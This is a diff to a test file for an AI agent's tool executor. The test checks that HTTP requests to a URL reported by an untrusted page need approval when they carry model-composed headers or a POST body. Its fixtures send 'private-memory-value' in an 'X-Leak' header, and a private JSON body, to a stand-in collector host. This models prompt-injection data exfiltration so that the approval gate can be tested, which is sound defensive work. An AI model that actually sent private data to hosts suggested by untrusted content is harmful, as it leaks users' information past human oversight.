@@ -583,7 +583,7 @@ test('http_request through the executor: model-composed headers or a POST body d
   const asked: ApprovalRequest[] = [];
   const executor = new ToolExecutor({
     registry: new ToolRegistry().register(tool),
-    policy: new Policy({ ...parseConfig({ version: CONFIG_VERSION }).permissions, 'net.fetch': 'allow' }),
+    policy: new Policy({ ...parseConfig({ version: CONFIG_VERSION }).permissions, 'net.fetch': 'allow', 'message.send': 'allow' }),
     approver: async (r) => (asked.push(r), 'denied'),
   });
   const url = 'https://collector.example/pixel';
@@ -592,7 +592,7 @@ test('http_request through the executor: model-composed headers or a POST body d
     executor.execute({ type: 'tool_call', id: 'c', name: 'http_request', input }, { sessionId: 's', workspace: '/w', memoryNamespace: 'default', signal: new AbortController().signal, taint });
   assert.equal((await call({ url })).status, 'ok', 'a plain GET of a URL an untrusted page reported is still exempt');
   assert.equal(asked.length, 0);
-  // A GET has no body, so headers are the only model-composed bytes it can carry; a POST also needs message.send.
+  // A GET has no body, so headers are the only model-composed bytes it can carry; with message.send allowed here, only carriesData makes the POST ask.
   for (const extra of [{ headers: { 'X-Leak': 'private-memory-value' } }, { method: 'POST', json: { k: 'private' } }]) {
     asked.length = 0;
     const before = seen.length;
